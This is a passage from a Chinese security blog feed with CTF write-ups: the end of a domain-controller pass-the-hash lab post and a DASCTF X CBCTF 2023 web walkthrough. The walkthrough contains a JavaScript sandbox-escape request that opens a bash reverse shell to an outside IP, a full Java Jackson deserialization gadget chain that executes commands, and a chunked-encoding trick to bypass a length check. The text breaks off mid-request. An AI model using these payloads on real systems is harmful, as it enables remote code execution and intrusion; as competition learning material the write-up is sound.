alt="image">​</p><h2 id="PTH域控打法"><a href="#PTH域控打法" class="headerlink" title="PTH域控打法"></a>PTH域控打法</h2><p>可以利用Win7横向PTH</p><p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231212093432-hl4qs4y.png" alt="image">​</p><p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231212093518-5k8rq96.png" alt="image">​</p><p>这里利用taowu的插件就可以横向了</p><p>​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1/image-20231212093530-90gyeya.png" alt="image">​</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF_X_CBCTF_2023</title>
      <link href="/2023/11/24/DASCTF%20X%20CBCTF%202023/"/>
      <url>/2023/11/24/DASCTF%20X%20CBCTF%202023/</url>
      
        <content type="html"><![CDATA[<h1 id="DASCTF-X-CBCTF-2023"><a href="#DASCTF-X-CBCTF-2023" class="headerlink" title="DASCTF_X_CBCTF_2023"></a>DASCTF_X_CBCTF_2023</h1><p>昨天心血来潮看一眼BUU，这个新比赛的web解好惨烈：</p><p>​<img src="/Blogimages/DASCTF_X_CBCTF_2023/image-20231110082612-ebb4zxt.png" alt="image">​</p><p>复现一下</p><h2 id="yet-another-sandbox"><a href="#yet-another-sandbox" class="headerlink" title="yet another sandbox"></a>yet another sandbox</h2><p>这题考的是js</p><p>关键源码：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">import</span> express <span class="token keyword">from</span> <span class="token string">'express'</span><span class="token punctuation">;</span><span class="token keyword">import</span> path <span class="token keyword">from</span> <span class="token string">'path'</span><span class="token punctuation">;</span><span class="token keyword">const</span> __dirname <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/asserts'</span><span class="token punctuation">,</span> express<span class="token punctuation">.</span><span class="token keyword">static</span><span class="token punctuation">(</span><span class="token string">'asserts'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">runInShadowRealm</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> shadowRealm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ShadowRealm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> result <span class="token operator">=</span> shadowRealm<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>    shadowRealm <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>_<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>__dirname<span class="token operator">+</span><span class="token string">'/index.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/api/run'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">try</span><span class="token punctuation">{</span>        <span class="token keyword">let</span> <span class="token punctuation">{</span> code <span class="token punctuation">}</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>        <span class="token keyword">var</span> msg <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">runInShadowRealm</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> msg <span class="token operator">=</span> error<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"msg"</span><span class="token punctuation">:</span> msg<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">1337</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Server listening on port 1337'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>可以看到命令执行的逻辑：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">runInShadowRealm</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> shadowRealm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ShadowRealm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> result <span class="token operator">=</span> shadowRealm<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>    shadowRealm <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这个是创建了一个SandBox，所以就是逃逸了</p><p>但是这个逃逸是怎么想到这个then的….</p><p>离谱：</p><pre class=" language-poc"><code class="language-poc">POST /api/run HTTP/1.1Host: 2b8e970c-cc14-4c21-8ccd-ee0ada3962df.node4.buuoj.cn:81Content-Length: 112User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0Content-Type: application/jsonAccept: */*Origin: http://2b8e970c-cc14-4c21-8ccd-ee0ada3962df.node4.buuoj.cn:81Referer: http://2b8e970c-cc14-4c21-8ccd-ee0ada3962df.node4.buuoj.cn:81/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Connection: close{"code":"import('child_process').then(m=>m.execSync('bash -c \"bash -i >& /dev/tcp/123.249.8.26/7777 <&1\"'));"}</code></pre><p>​<img src="/Blogimages/DASCTF_X_CBCTF_2023/image-20231110083317-kdfjqem.png" alt="image">​</p><p>‍</p><h2 id="BypassJava"><a href="#BypassJava" class="headerlink" title="BypassJava"></a>BypassJava</h2><p>我感觉这是一个很不错的题目，虽然有点套，但是套的都是我不会的，而且还有一个新的绕过RASP姿势，所以爱了，学了不少东西，题目挺好的，👍</p><h3 id="第一个点：Jackson反序列化链，这个是常考题了，就不赘述了"><a href="#第一个点：Jackson反序列化链，这个是常考题了，就不赘述了" class="headerlink" title="第一个点：Jackson反序列化链，这个是常考题了，就不赘述了"></a>第一个点：Jackson反序列化链，这个是常考题了，就不赘述了</h3><p>常用的有三条,贴一条链子吧</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>com<span class="token punctuation">.</span>jackson<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>node<span class="token punctuation">.</span>POJONode<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>deploy<span class="token punctuation">.</span>cache<span class="token punctuation">.</span>BaseLocalApplicationProperties<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span>AbstractTranslet<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TemplatesImpl<span class="token punctuation">;</span><span class="token keyword">import</span> javassist<span class="token punctuation">.</span>ClassPool<span class="token punctuation">;</span><span class="token keyword">import</span> javassist<span class="token punctuation">.</span>CtClass<span class="token punctuation">;</span><span class="token keyword">import</span> javassist<span class="token punctuation">.</span>CtConstructor<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpEntity<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>http<span class="token punctuation">.</span>HttpHeaders<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>http<span class="token punctuation">.</span>ResponseEntity<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>client<span class="token punctuation">.</span>RestTemplate<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span>BadAttributeValueExpException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URI<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span>Files<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span>Paths<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Base64<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SignedObjectChain</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        ClassPool pool <span class="token operator">=</span> ClassPool<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        CtClass ctClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        CtClass superClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctClass<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>superClass<span class="token punctuation">)</span><span class="token punctuation">;</span>        CtConstructor constructor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CtConstructor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CtClass</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>ctClass<span class="token punctuation">)</span><span class="token punctuation">;</span>        constructor<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token string">"Runtime.getRuntime().exec(\"calc\");"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctClass<span class="token punctuation">.</span><span class="token function">addConstructor</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TemplatesImpl templatesImpl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>bytes<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"qingfeng"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>        POJONode jsonNodes2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">POJONode</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">)</span><span class="token punctuation">;</span>        BadAttributeValueExpException exp2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        Field val2 <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"javax.management.BadAttributeValueExpException"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        val2<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        val2<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>exp2<span class="token punctuation">,</span>jsonNodes2<span class="token punctuation">)</span><span class="token punctuation">;</span>        KeyPairGenerator keyPairGenerator<span class="token punctuation">;</span>        keyPairGenerator <span class="token operator">=</span> KeyPairGenerator<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DSA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        keyPairGenerator<span class="token punctuation">.</span><span class="token function">initialize</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        KeyPair keyPair <span class="token operator">=</span> keyPairGenerator<span class="token punctuation">.</span><span class="token function">genKeyPair</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        PrivateKey privateKey <span class="token operator">=</span> keyPair<span class="token punctuation">.</span><span class="token function">getPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Signature signingEngine <span class="token operator">=</span> Signature<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DSA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        SignedObject signedObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SignedObject</span><span class="token punctuation">(</span>exp2<span class="token punctuation">,</span>privateKey<span class="token punctuation">,</span>signingEngine<span class="token punctuation">)</span><span class="token punctuation">;</span>        POJONode jsonNodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">POJONode</span><span class="token punctuation">(</span>signedObject<span class="token punctuation">)</span><span class="token punctuation">;</span>        BadAttributeValueExpException exp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        Field val <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"javax.management.BadAttributeValueExpException"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        val<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        val<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>exp<span class="token punctuation">,</span>jsonNodes<span class="token punctuation">)</span><span class="token punctuation">;</span>        ByteArrayOutputStream barr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectOutputStream objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>exp<span class="token punctuation">)</span><span class="token punctuation">;</span>        FileOutputStream fout<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        fout<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>barr<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        fout<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        FileInputStream fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%x\n"</span><span class="token punctuation">,</span> <span class="token function">serial</span><span class="token punctuation">(</span>exp<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">serial</span><span class="token punctuation">(</span>exp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        deserial(serial(exp));</span>        <span class="token comment" spellcheck="true">//doPOST(exp.toString().getBytes());</span>        <span class="token comment" spellcheck="true">//byte[] byt=new byte[fileInputStream.available()];</span>        <span class="token comment" spellcheck="true">//fileInputStream.read(byt);</span>        <span class="token comment" spellcheck="true">//doPOST(byt);</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">doPOST</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        HttpHeaders requestHeaders <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HttpHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        requestHeaders<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"text/plain"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        URI url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URI</span><span class="token punctuation">(</span><span class="token string">"http://112.124.14.13:8080/bypassit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//URI url = new URI("http://localhost:8080/bypassit");</span>        HttpEntity<span class="token operator">&lt;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span> requestEntity <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HttpEntity</span> <span class="token operator">&lt;</span><span class="token operator">></span> <span class="token punctuation">(</span>obj<span class="token punctuation">,</span>requestHeaders<span class="token punctuation">)</span><span class="token punctuation">;</span>        RestTemplate restTemplate <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RestTemplate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ResponseEntity<span class="token operator">&lt;</span>String<span class="token operator">></span> res <span class="token operator">=</span> restTemplate<span class="token punctuation">.</span><span class="token function">postForEntity</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> requestEntity<span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span><span class="token function">getBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">serial</span><span class="token punctuation">(</span>Object o<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> NoSuchFieldException <span class="token punctuation">{</span>        ByteArrayOutputStream baos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectOutputStream oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>baos<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//Field writeReplaceMethod = ObjectStreamClass.class.getDeclaredField("writeReplaceMethod");</span>        <span class="token comment" spellcheck="true">//writeReplaceMethod.setAccessible(true);</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String base64String <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>baos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> base64String<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">deserial</span><span class="token punctuation">(</span>String data<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> base64decodedBytes <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        ByteArrayInputStream bais <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>base64decodedBytes<span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>bais<span class="token punctuation">)</span><span class="token punctuation">;</span>        ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ois<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Base64Encode</span><span class="token punctuation">(</span>ByteArrayOutputStream bs<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> encode <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>encode<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">,</span> String field<span class="token punctuation">,</span> Object arg<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        Field f <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span><span class="token punctuation">;</span>        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>​<img src="/Blogimages/DASCTF_X_CBCTF_2023/image-20231123105058-s0b9maj.png" alt="image">​</p><p>验证可以弹计算器即可</p><h3 id="第二个点：chuncked绕过getContentLength"><a href="#第二个点：chuncked绕过getContentLength" class="headerlink" title="第二个点：chuncked绕过getContentLength"></a>第二个点：chuncked绕过getContentLength</h3><p>这个理解和学习都是比较简单的，主要是从源码入手</p><p>可以选择调试跟进：<code>org.apache.coyote.http11.Http11Processor</code>​ </p><p>​<img src="/Blogimages/DASCTF_X_CBCTF_2023/image-20231113103826-k94s1f8.png" alt="image">​</p><p>要走到829行，让<code>contentLength = -1</code>​就要使得前面的if都成立</p><p>我们打个断点调试，发送chuncked包：</p><pre class=" language-xml"><code class="language-xml">POST /read HTTP/1.1Host: 192.168.120.1:8000Transfer-Encoding:chunkedContent-Type: text/plainContent-Length: 283218qingfeng0</code></pre><p>POST数据部分：</p><pre class=" language-xml"><code class="language-xml">第一行的8表示发送的数据内容长度第二行就是表示发送的数据内容第三行就是0表示结尾</code></pre><p>收到包：</p><p>​<img src="/Blogimages/DASCTF_X_CBCTF_2023/image-20231113104102-w6m3986.png" alt="image">​</p><p>可以看到只要我们发送合法的chuncked包就可以满足所有的if</p><p>然后控制他为​<code>long contentLength = -1;</code>​</p><p>​<img src="/Blogimages/DASCTF_X_CBCTF_2023/image-20231113104333-kgkmwnn.png" alt="image"></p><p>这样我们就绕过<code>contentLength </code>​的长度限制了</p><p>验证弹计算器：</p><pre class=" language-poc"><code class="language-poc">POST /read HTTP/1.1Host: 